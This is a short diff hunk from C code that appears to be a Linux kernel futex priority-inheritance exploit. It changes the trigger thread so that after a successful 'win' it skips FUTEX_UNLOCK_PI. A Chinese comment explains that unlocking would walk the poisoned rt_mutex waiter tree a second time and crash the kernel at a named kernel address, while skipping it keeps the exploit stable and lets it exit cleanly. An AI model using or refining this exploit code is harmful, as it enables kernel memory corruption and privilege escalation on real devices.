@@ -354,7 +354,18 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
       pr_info("mt25: futex trigger %d ret=%ld errno=%d\n", ti, fret, errno);
       fflush(stdout);
       if (fret == 0) {
-        futex_op(&slide_f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+        /* mt53 (spec2): win 后默认不再 UNLOCK_PI。旧 UNLOCK 走
+         * rt_mutex_futex_unlock → mark_wakeup_next_waiter → 对毒树做
+         * 第二次 rb_erase + 树空 brk 检查 (0xffffffc0081e9728+0x1ec) —
+         * win 后第一个自伤 walk。不 UNLOCK: word 保持 self-owned → 后续
+         * 发次 fast-fail (不进 task_blocks_on_rt_mutex 的 prio_chain 雷),
+         * burst 尾弹无害化; 退出走 futex_exit_release (0 断言) +
+         * handle_futex_death (cmpxchg 路径, 不走 waiters 树)。
+         * PSELECT_UNLOCK_AFTER_WIN=1 恢复旧行为。 */
+        if (!getenv("PSELECT_UNLOCK_AFTER_WIN"))
+          pr_info("mt53: WIN shot=%d - skipping UNLOCK_PI (silence window)\n", ti);
+        else
+          futex_op(&slide_f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
         trig_hits++;
       }
       usleep(20000);
